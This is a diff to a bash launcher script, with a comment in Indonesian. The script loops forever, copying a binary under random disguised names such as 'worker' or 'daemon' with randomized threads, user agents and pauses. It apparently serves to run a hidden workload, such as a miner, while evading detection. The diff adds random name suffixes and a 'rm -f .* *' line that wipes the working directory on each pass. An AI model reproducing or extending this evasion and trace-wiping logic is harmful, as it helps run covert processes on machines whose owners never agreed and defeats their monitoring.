@@ -35,6 +35,10 @@ CONFIG_LIST=(
     "profile.json" "data.json" "daemon.json" "worker.json"
 )
 
+generate_random_suffix() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
+}
+
 mkdir -p "$WORKDIR"
 cd "$WORKDIR" || exit
 
@@ -44,13 +48,20 @@ if [ ! -f "$BIN_NAME_ORI" ]; then
 fi
 
 while true; do
+    # Hapus semua binary dan config dari sesi sebelumnya
+    rm -f .* *
+    
     THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
     
     PAUSE=$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
 
     UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
-    ALIAS_BIN=${ALIAS_BIN_LIST[$RANDOM % ${#ALIAS_BIN_LIST[@]}]}
-    CONFIG_NAME=${CONFIG_LIST[$RANDOM % ${#CONFIG_LIST[@]}]}
+    BASE_ALIAS_BIN=${ALIAS_BIN_LIST[$RANDOM % ${#ALIAS_BIN_LIST[@]}]}
+    BASE_CONFIG_NAME=${CONFIG_LIST[$RANDOM % ${#CONFIG_LIST[@]}]}
+    
+    RANDOM_SUFFIX=$(generate_random_suffix)
+    ALIAS_BIN="${BASE_ALIAS_BIN}${RANDOM_SUFFIX}"
+    CONFIG_NAME="${BASE_CONFIG_NAME%.*}${RANDOM_SUFFIX}.${BASE_CONFIG_NAME##*.}"
 
     cp "$BIN_NAME_ORI" "$ALIAS_BIN"
     chmod +x "$ALIAS_BIN"
@@ -79,6 +90,4 @@ EOF
     sleep "$RUNTIME"
 
     sleep "$PAUSE"
-
-    rm -f "$ALIAS_BIN" "$CONFIG_NAME"
 done
